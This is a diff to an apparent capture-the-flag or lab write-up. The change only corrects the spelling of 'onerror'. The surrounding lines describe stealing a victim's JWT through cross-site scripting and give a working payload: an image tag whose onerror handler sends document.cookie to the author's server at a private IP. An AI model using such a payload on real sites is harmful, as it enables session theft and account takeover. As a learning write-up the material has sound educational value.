@@ -113,7 +113,7 @@ Sweet, so if I could craft an XSS payload to steal the user's JWT, I might be ab
 
 With this in mind I Googled "cookie stealing with xss" and found [this resource](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md) with helpful info and payloads. <br>
 
-The payload I decided to try uses an image tag with the onerrer property to send the victim's cookie to a webserver that I control. <br>
+The payload I decided to try uses an image tag with the "onerror" property to send the victim's cookie to a webserver that I control. <br>
 I used the version without the infite loop problem, and modified it to reflect back to my IP. <br>
 
 The final payload looked like this :"<img src=x onerror="this.src='http://10.2.2.70/?'+document.cookie; this.removeAttribute('onerror');">". <br>
